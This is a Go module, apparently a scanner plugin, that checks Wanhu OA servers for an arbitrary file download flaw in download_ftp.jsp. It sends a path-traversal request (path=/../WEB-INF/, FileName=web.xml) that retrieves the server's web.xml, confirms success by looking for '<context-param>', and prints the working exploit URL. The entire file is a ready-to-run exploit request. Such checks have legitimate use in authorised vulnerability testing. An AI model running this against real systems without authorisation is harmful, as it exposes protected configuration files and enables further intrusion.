package wanhu_download_ftp

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(8 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		Get(vulnUrl)
	if err == nil && resp.StatusCode == 200 {
		body := resp.String()
		if strings.Contains(body, "<context-param>") {
			return true
		}
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		cheurl := url + "/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml"
		color.Green.Println("[+03] 万户OA download_ftp.jsp 任意文件下载漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[+03] 万户OA download_ftp.jsp 任意文件下载漏洞不存在")
	}

}
